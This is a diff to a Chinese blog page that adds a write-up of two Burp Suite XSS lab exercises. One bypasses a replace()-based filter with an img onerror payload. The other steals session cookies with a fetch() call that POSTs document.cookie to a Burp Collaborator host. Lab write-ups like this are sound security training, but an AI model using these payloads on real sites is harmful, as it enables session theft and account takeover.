@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102104890.jpg">
 <meta property="article:published_time" content="2022-11-10T07:28:02.000Z">
-<meta property="article:modified_time" content="2022-11-17T16:10:59.891Z">
+<meta property="article:modified_time" content="2022-11-18T15:42:11.382Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="burpsuite靶场">
 <meta property="article:tag" content="xss">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.8k 字
+          3.6k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          24 分钟
+          30 分钟
         
       </span>
     
@@ -426,6 +426,37 @@
 
 <p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211180010629.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
 <p>成功触发</p>
+<h3 id="13-存储的-DOM-XSS"><a href="#13-存储的-DOM-XSS" class="headerlink" title="13.存储的 DOM XSS"></a>13.存储的 DOM XSS</h3><p>尝试插入</p>
+<p><u>aa</p>
+<p>在js中发现了过滤</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182319359.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>为了防止<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XSS&spm=1001.2101.3001.7020">XSS</a>，该网站使用 JavaScriptreplace()函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一次出现。我们通过在注释的开头简单地包含一组额外的尖括号来利用此漏洞。这些尖括号将被编码，但任何后续尖括号将不受影响，使我们能够有效地绕过过滤器并注入 HTML。</p>
+<p>所以构造payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182321693.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182321291.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>完成实验</p>
+<h3 id="14-利用跨站点脚本窃取-cookie"><a href="#14-利用跨站点脚本窃取-cookie" class="headerlink" title="14.利用跨站点脚本窃取 cookie"></a>14.利用跨站点脚本窃取 cookie</h3><p>插入简单payload就造成弹窗</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>那我们构造payload把cookie发送到Burp Collaborator Client</p>
+<p>payload</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">fetch(&#x27;https<span class="hljs-symbol">://BURP-COLLABORATOR-SUBDOMAIN</span>&#x27;, &#123;<br>method: &#x27;POST&#x27;,<br>mode: &#x27;no-cors&#x27;,<br>body<span class="hljs-symbol">:document</span>.cookie<br>&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>Burp Collaborator Client使用</p>
+<p>点击run测试是否正常</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182333722.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>点击burp 选择Collaborator Client打开</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182334292.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>然后点击复制</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182338820.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>把复制的内容填入</p>
+<p>payload fetch</p>
+<p>最终payload样式为</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">fetch(&#x27;https<span class="hljs-symbol">://dctl6v7eyxdtdzfvec95ysw980er6fv</span>.burpcollaborator.net&#x27;, &#123;<br>method: &#x27;POST&#x27;,<br>mode: &#x27;no-cors&#x27;,<br>body<span class="hljs-symbol">:document</span>.cookie<br>&#125;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>获取cookie之后替换即可</p>
 
                 
               </div>
